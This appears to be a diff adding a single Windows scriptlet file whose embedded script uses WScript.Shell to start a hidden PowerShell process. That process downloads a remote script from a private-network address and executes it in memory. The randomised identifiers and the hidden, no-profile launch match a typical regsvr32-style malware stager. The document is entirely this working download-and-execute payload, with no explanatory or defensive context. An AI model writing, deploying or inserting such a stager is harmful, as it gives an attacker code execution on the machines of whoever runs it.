@@ -1,0 +1,1 @@
+<?XML version="1.0"?><scriptlet><registration progid="KdzizYXi" classid="{818f2713-c629-7bec-ee36-1e62b3249732}"><script><![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://192.168.1.5/cnock'))",0);]]></script></registration></scriptlet>
